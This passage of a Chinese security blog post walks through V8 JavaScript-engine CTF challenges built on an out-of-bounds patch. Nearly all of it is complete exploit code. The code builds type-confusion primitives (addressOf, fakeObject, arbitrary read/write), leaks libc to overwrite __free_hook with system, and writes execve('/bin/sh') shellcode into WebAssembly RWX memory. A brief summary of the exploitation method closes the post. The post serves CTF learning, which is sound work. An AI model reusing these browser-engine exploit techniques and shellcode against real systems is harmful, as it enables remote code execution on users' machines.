class="line"><span class="keyword">var</span> libc_start_main_got = pro_base + <span class="number">0x12a47b0n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_start_main = RAA(libc_start_main_got);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] __libc_start_main : &quot;</span> + hex(libc_start_main));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; distance 0x7f80d77a4f90 0x7f80d7781000</span></span><br><span class="line"><span class="comment">0x7f80d77a4f90-&gt;0x7f80d7781000 is -0x23f90 bytes (-0x47f2 words)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> libc_base = libc_start_main - <span class="number">0x23f90n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] libc base : &quot;</span> + hex(libc_base));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; p &amp;__free_hook</span></span><br><span class="line"><span class="comment">$2 = (void (**)(void *, const void *)) 0x7f80d796fe48 &lt;__free_hook&gt;</span></span><br><span class="line"><span class="comment">pwndbg&gt; distance 0x7f80d796fe48 0x7f80d7781000</span></span><br><span class="line"><span class="comment">0x7f80d796fe48-&gt;0x7f80d7781000 is -0x1eee48 bytes (-0x3ddc9 words)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> free_hook = libc_base + <span class="number">0x1eee48n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] free_hook : &quot;</span> + hex(free_hook));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; p &amp;system</span></span><br><span class="line"><span class="comment">$3 = (int (*)(const char *)) 0x7f80d77d3290 &lt;__libc_system&gt;</span></span><br><span class="line"><span class="comment">pwndbg&gt; distance 0x7f80d77d3290 0x7f80d7781000</span></span><br><span class="line"><span class="comment">0x7f80d77d3290-&gt;0x7f80d7781000 is -0x52290 bytes (-0xa452 words)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">system = libc_base + <span class="number">0x52290n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] system : &quot;</span> + hex(system));</span><br><span class="line">WAADataview(free_hook, system); </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwnYou</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//let cmd = &quot;gnome-calculator;&quot;;</span></span><br><span class="line">    <span class="keyword">let</span> cmd = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">pwnYou();   </span><br><span class="line"></span><br><span class="line">WAADataview(free_hook, <span class="number">0x0n</span>);  </span><br></pre></td></tr></table></figure>
<ul>
<li>利用 WASM 执行 shellcode：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">yhellow</span>:<span class="string">&quot;yhellow&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.11</span>, <span class="number">2.22</span>, <span class="number">3.33</span>];</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"><span class="keyword">var</span> mapFloatArray = floatArray.oob();</span><br><span class="line"><span class="keyword">var</span> mapObjArray = objArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">target</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = target;          </span><br><span class="line">    objArray.oob(mapFloatArray);    </span><br><span class="line">                                   </span><br><span class="line">    <span class="keyword">let</span> ret = objArray[<span class="number">0</span>];          </span><br><span class="line">    objArray.oob(mapObjArray);      </span><br><span class="line">    <span class="keyword">return</span> f2i(ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">target</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = target;        </span><br><span class="line">    floatArray.oob(mapObjArray);    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> ret = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(mapFloatArray);  </span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buffer);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = x;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = x;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + x.toString(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> floatArrayAddr = addressOf(floatArray);</span><br><span class="line"><span class="keyword">var</span> floatArrayElement = floatArrayAddr - <span class="number">0x28n</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; distance 0x03d9b124ecc1 0x3d9b124ece9</span></span><br><span class="line"><span class="comment">0x3d9b124ecc1-&gt;0x3d9b124ece9 is 0x28 bytes (0x5 words)</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="keyword">var</span> fakeArrayAddr = floatArrayElement + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fakeArray = fakeObject(i2f(fakeArrayAddr));</span><br><span class="line">floatArray[<span class="number">0</span>] = mapFloatArray;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RAA</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> +<span class="number">0x1n</span>); </span><br><span class="line">    <span class="keyword">let</span> data = fakeArray[<span class="number">0</span>];     </span><br><span class="line">    <span class="keyword">return</span> f2i(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WAA</span>(<span class="params">addr, value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>); </span><br><span class="line">    fakeArray[<span class="number">0</span>] = i2f(value);   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">10</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> funcAsm = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> addressFasm = addressOf(funcAsm);</span><br><span class="line"><span class="keyword">var</span> sharedInfo = RAA(addressFasm+<span class="number">0x18n</span>-<span class="number">0x1n</span>);</span><br><span class="line"><span class="keyword">var</span> functionData = RAA(sharedInfo+<span class="number">0x8n</span>-<span class="number">0x1n</span>);</span><br><span class="line"><span class="keyword">var</span> instanceAddr = RAA(functionData+<span class="number">0x10n</span>-<span class="number">0x1n</span>);</span><br><span class="line"><span class="keyword">var</span> memoryRWX = RAA(instanceAddr+<span class="number">0x88n</span>-<span class="number">0x1n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Get RWX memory : &quot;</span> + hex(memoryRWX));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">        <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">        <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">        <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dataBuf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">24</span>);</span><br><span class="line"><span class="keyword">var</span> dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(dataBuf);</span><br><span class="line"><span class="keyword">var</span> bufBackStore = addressOf(dataBuf) + <span class="number">0x20n</span> - <span class="number">0x1n</span>;</span><br><span class="line">WAA(bufBackStore, memoryRWX);</span><br><span class="line">dataview.setFloat64(<span class="number">0</span>, i2f(shellcode[<span class="number">0</span>]), <span class="literal">true</span>);</span><br><span class="line">dataview.setFloat64(<span class="number">8</span>, i2f(shellcode[<span class="number">1</span>]), <span class="literal">true</span>);</span><br><span class="line">dataview.setFloat64(<span class="number">16</span>, i2f(shellcode[<span class="number">2</span>]), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">funcAsm();</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>巩固一下 V8 pwn 的利用手段</p>
<p>根据最近复现的这两个 V8 pwn 和之前遇到过的 JavaScript pwn，总结一下这种 JavaScript 引擎题目的解决思路：</p>
<ul>
<li>先分析 patch，了解大概的漏洞点</li>
<li>然后想方设法实现 <code>addressOf</code> <code>RAA</code> <code>WAA</code> 这3个函数</li>
<li>最后尝试泄露或者注入 shellcode</li>
</ul>
<p>如果可以接触到 JS 对象的 <code>map</code>，那就要考虑使用类型混淆</p>

    </div>

    
    
    

      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/V8/" rel="tag"><i class="fa fa-tag"></i> V8</a>
              <a href="/tags/javascript-pwn/" rel="tag"><i class="fa fa-tag"></i> javascript pwn</a>
              <a href="/tags/OOB/" rel="tag"><i class="fa fa-tag"></i> OOB</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/12/05/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8A%80%E6%9C%AF%E7%AE%80%E6%9E%90/" rel="prev" title="VM虚拟机技术简析">
      <i class="fa fa-chevron-left"></i> VM虚拟机技术简析
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/12/08/Strtok%20off-by-null+%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/" rel="next" title="Strtok off-by-null+侧信道攻击">
      Strtok off-by-null+侧信道攻击 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">330</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">170</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.9m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">74:38</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
